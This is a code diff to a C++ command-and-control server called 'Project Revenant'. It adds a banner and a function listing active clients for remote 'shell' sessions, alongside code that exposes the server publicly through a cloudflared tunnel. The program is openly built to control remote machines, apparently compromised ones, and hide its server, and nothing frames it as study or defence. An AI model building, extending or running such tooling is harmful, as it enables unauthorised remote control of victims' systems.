@@ -8,6 +8,8 @@ using namespace std;
 
 int id = 0;
 
+
+
 string start_cloudflared() {
 
     system("cloudflared tunnel --url http://localhost:8080 > cloudflared.log 2>&1 &");
@@ -42,5 +44,40 @@ string start_cloudflared() {
 }
 
 void banner() {
-    cout << "=== Welcome to My C2 Tool ===" << endl;
+    cout << R"(
+
+██████  ███████ ██    ██ ███████ ███    ██  █████  ███    ██ ████████ 
+██   ██ ██      ██    ██ ██      ████   ██ ██   ██ ████   ██    ██    
+██████  █████   ██    ██ █████   ██ ██  ██ ███████ ██ ██  ██    ██    
+██   ██ ██      ██    ██ ██      ██  ██ ██ ██   ██ ██  ██ ██    ██    
+██   ██ ███████  ██████  ███████ ██   ████ ██   ██ ██   ████    ██    
+                                                                         
+
+                Lightweight C2 Server - Project Revenant
+------------------------------------------------------------------
+
+)" << endl;
 }
+void show_shell(const unordered_map<string, int>& mp) {
+    cout << "\n============================\n";
+    cout << "   [+] Active Clients\n";
+    cout << "============================\n";
+
+    if (mp.empty()) {
+        cout << "[!] No active clients.\n";
+    } else {
+        int count = 1;
+        for (const auto& pair : mp) {
+            cout << "[" << count << "] " << pair.first << "\n";
+            count++;
+        }
+    }
+
+    cout << "----------------------------\n";
+    cout << "Usage: shell <Endpoint>\n";
+    cout << "----------------------------\n\n";
+}
+
+//system("cloudflared tunnel --url http://localhost:8080 > cloudflared.log 2>&1 & echo $! > cloudflared.pid");
+//system("kill $(cat cloudflared.pid)");
+//system("rm cloudflared.pid");  // clean up PID file
